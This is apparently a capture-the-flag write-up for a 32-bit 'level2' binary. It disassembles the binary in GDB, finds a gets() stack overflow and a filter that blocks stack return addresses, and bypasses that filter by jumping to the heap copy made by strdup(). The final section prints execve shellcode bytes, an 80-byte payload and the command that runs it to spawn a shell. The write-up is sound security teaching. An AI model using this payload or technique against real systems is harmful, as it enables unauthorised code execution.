# Level2 - ASM Analysis (GDB only)

## Prerequisites for Exploitation

Before attempting a buffer overflow exploit, it is important to assess whether the environment is vulnerable. Several protections could prevent or hinder exploitation.

### 1. Address Space Layout Randomization (ASLR)

ASLR randomizes the memory layout of a process, especially stack and heap addresses. This makes exploits relying on static addresses unreliable.

Check ASLR status:

```bash
$ cat /proc/sys/kernel/randomize_va_space
0
```

A value of `0` means ASLR is disabled, so memory addresses will remain consistent between runs. This is ideal for exploitation.

### 2. Stack Protections (Canary, NX, PIE)

Modern binaries may include protections like:

* **Stack canaries**: detect stack corruption.
* **NX (No eXecute)**: prevents execution of code on the stack.
* **PIE (Position Independent Executable)**: causes code sections to be loaded at random addresses.

We inspect protections with `checksec`:

```bash
$ checksec --file ./level2
```

Expected output:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level2
```

Interpretation:

* **No canary**: We can overwrite the return address without triggering a stack protector.
* **NX disabled**: The stack is executable, which would allow shellcode to run from there (though in this level it is restricted by the program itself).
* **No PIE**: The binary is loaded at a fixed address, so function and data pointers are predictable.

### Conclusion

This binary is compiled without modern protections, making it vulnerable to classic buffer overflow attacks. However, as we will see later, the program enforces a manual check that **prevents jumping to the stack**, forcing us to redirect execution elsewhere (e.g., the heap).

We will now move on to disassembling and analyzing the binary's functions using GDB.

---

## Disassembly Analysis

### Functions Identified

Using the `info functions` command in GDB, we identify the following symbols defined in the binary:

```gdb
0x080484d4  p
0x0804853f  main
```

These are the application-specific functions we will analyze.

---

### Disassembly of `main`

We begin by analyzing the `main()` function:

```asm
0x0804853f <+0>:     push   %ebp
0x08048540 <+1>:     mov    %esp,%ebp
0x08048542 <+3>:     and    $0xfffffff0,%esp
0x08048545 <+6>:     call   0x80484d4 <p>
0x0804854a <+11>:    leave
0x0804854b <+12>:    ret
```

#### Explanation:

* `<+0>` Save the old base pointer.
* `<+1>` Establish a new stack frame.
* `<+3>` Align the stack to a 16-byte boundary (standard calling convention).
* `<+6>` Call the vulnerable function `p()`.
* `<+11–12>` Restore previous frame and return.

The main function performs no checks or processing of its own. It delegates execution entirely to `p()`.

---

### Disassembly of `p`

#### Function Prologue

```asm
0x080484d4 <+0>:     push   %ebp
0x080484d5 <+1>:     mov    %esp,%ebp
0x080484d7 <+3>:     sub    $0x68,%esp
```

* `<+0>` Save the old base pointer.
* `<+1>` Set up the new base pointer.
* `<+3>` Reserve 104 bytes on the stack for local variables.

#### Flush stdout

```asm
0x080484da <+6>:     mov    0x8049860,%eax
0x080484df <+11>:    mov    %eax,(%esp)
0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
```

* `<+6>` Load address of `stdout`.
* `<+11>` Move it into stack argument.
* `<+14>` Call `fflush(stdout)` to flush any pending output.

#### Vulnerable gets()

```asm
0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
0x080484ea <+22>:    mov    %eax,(%esp)
0x080484ed <+25>:    call   0x80483c0 <gets@plt>
```

* `<+19>` Compute address of buffer on stack.
* `<+22>` Pass it to `gets()`.
* `<+25>` Call unsafe `gets()` — **buffer overflow risk**.

#### Capture return address

```asm
0x080484f2 <+30>:    mov    0x4(%ebp),%eax
0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
```

* `<+30>` Load saved return address from `[ebp+4]`.
* `<+33>` Store it in local variable `[ebp-0xc]`.

#### Return address filter

```asm
0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
0x080484fb <+39>:    and    $0xb0000000,%eax
0x08048500 <+44>:    cmp    $0xb0000000,%eax
0x08048505 <+49>:    jne    0x8048527 <p+83>
```

* `<+36>` Reload return address.
* `<+39>` Apply mask to check if it's on the stack (starts with 0xb...).
* `<+44>` Compare with `0xb0000000`.
* `<+49>` Jump if check fails (address not on stack).

#### Handle invalid return address

```asm
0x08048507 <+51>:    mov    $0x8048620,%eax
0x0804850c <+56>:    mov    -0xc(%ebp),%edx
0x0804850f <+59>:    mov    %edx,0x4(%esp)
0x08048513 <+63>:    mov    %eax,(%esp)
0x08048516 <+66>:    call   0x80483a0 <printf@plt>
```

* `<+51>` Load format string address.
* `<+56>` Load rejected return address.
* `<+63>` Prepare arguments for `printf("%p")`.
* `<+66>` Call `printf()`.

```asm
0x0804851b <+71>:    movl   $0x1,(%esp)
0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
```

* `<+71>` Set exit code 1.
* `<+78>` Immediately terminate the process with `_exit(1)`.

#### Echo input

```asm
0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
0x0804852a <+86>:    mov    %eax,(%esp)
0x0804852d <+89>:    call   0x80483f0 <puts@plt>
```

* `<+83>` Load buffer address.
* `<+86>` Pass it to `puts()`.
* `<+89>` Print the input string.

#### Copy to heap

```asm
0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
0x08048535 <+97>:    mov    %eax,(%esp)
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```

* `<+94>` Load buffer address.
* `<+97>` Pass it to `strdup()`.
* `<+100>` Copy the buffer to heap memory.

#### Function Epilogue

```asm
0x0804853d <+105>:   leave
0x0804853e <+106>:   ret
```

* `<+105>` Clean up stack frame.
* `<+106>` Return to (possibly overwritten) return address.

---

We have now identified the vulnerable buffer, the address filtering logic, and the heap allocation. Next, we will analyze runtime behavior and validate these findings interactively with GDB.

## GDB Runtime Analysis

### Step-by-Step Runtime Inspection with GDB

We will now use GDB to confirm the following:

* The location of the vulnerable buffer
* The offset required to reach the return address
* The effect of the return address filtering logic
* The location of the duplicated buffer on the heap

---

### 1. Breakpoint before `gets()`

We begin by setting a breakpoint just before the call to `gets()`:

```gdb
$ gdb ./level2
(gdb) break *0x080484ed  # call to gets()
(gdb) run
```

Once the breakpoint is hit, we are paused before user input is read:

```gdb
Breakpoint 1, 0x080484ed in p ()
```

---

### 2. Finding the Overflow Offset

We need to determine how many bytes are required to overwrite the return address.

#### Manual approach using GDB

From our disassembly, we know the buffer starts at `[ebp-0x4c]` and the saved return address is at `[ebp+4]`. We compute the distance:

```gdb
(gdb) print ($ebp + 4) - ($ebp - 0x4c)
$1 = 80
```

This gives us an exact value: **80 bytes** are required to overflow up to EIP.

**Pattern-based approach (Metasploit)**

We can also use Metasploit’s tools to find the offset automatically:

```bash
$ msf-pattern_create -l
100Aa0Aa1Aa2Aa3...
```

Inject the pattern into the binary:

```gdb
(gdb) run
Aa0Aa1Aa2Aa3...
Program received signal SIGSEGV
(gdb) info registers eip
EIP: 0x37634136
```

Then compute the offset:

```bash
$ msf-pattern_offset -q 0x37634136
[*] Exact match at offset 80
```

### 3. Strategy to Bypass the Return Address Filter

After `gets()` reads our input and we overflow the buffer, the program checks whether the overwritten return address lies in the **stack region**. This is done using the following instructions:

```asm
mov    0x4(%ebp), %eax
and    $0xb0000000, %eax
cmp    $0xb0000000, %eax
```

If the return address starts with `0xb`, the program considers it unsafe and exits immediately. This is designed to prevent jumping into **stack-based shellcode**.

#### Key Insight

This filter blocks us from jumping to shellcode on the stack (e.g., injected in the buffer). However, the program also calls `strdup()` on our input after the return address check. `strdup()` duplicates our input into **heap memory**, which resides in a region like `0x0804xxxx` and crucially, **does not start with 0xb**.

This gives us a safe landing spot for our shellcode.

---

### 4. Observe the Heap Copy Address

We want to know exactly where `strdup()` copies our input on the heap so we can jump to that location.

We break right after the call to `strdup()`:

```gdb
(gdb) break *0x0804853d
(gdb) continue
```

Then type any input:

```
hello
```

Once the breakpoint is hit, we inspect the return value of `strdup()` (in EAX):

```gdb
(gdb) print/x $eax
$2 = 0x0804a008
```

This tells us that our input was duplicated at address `0x0804a008`.

We’ll now inject the real shellcode and overwrite the return address with this address.

---

### 5. Final Exploit Payload

We use a standard Linux x86 execve shellcode (`execve("/bin//sh")`), which is 28 bytes long. Then we pad with 52 bytes of junk to reach 80 bytes total, and overwrite EIP with the heap address (`0x0804a008`):

```bash
python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08")' > /tmp/exploit
```

We now have a working exploit payload ready to inject. The final step is to run it in the binary and validate that we gain a shell.

```bash
cat /tmp/exploit - | ./level2
```
Using `-` ensures that the standard input remains open after sending the payload, allowing the spawned shell to stay interactive.

---

## Conclusion

Through step-by-step runtime analysis in GDB, we confirmed that the binary:

* Reads user input into a stack-allocated buffer using the unsafe `gets()` function.
* Does not perform bounds checking, allowing us to overwrite the saved return address.
* Implements a filtering check to prevent returning to the stack, by rejecting return addresses that begin with `0xb...`.
* Duplicates the user input to the heap using `strdup()`, giving us an alternative location for shellcode injection.

By crafting a payload containing shellcode followed by padding and the address returned by `strdup()`, we successfully redirected the program’s execution flow and gained code execution.

This level demonstrates a more advanced exploitation scenario where direct stack execution is blocked. It reinforces the importance of analyzing runtime behavior, stack layout, and how functions like `strdup()` can introduce useful side effects when building a working exploit.
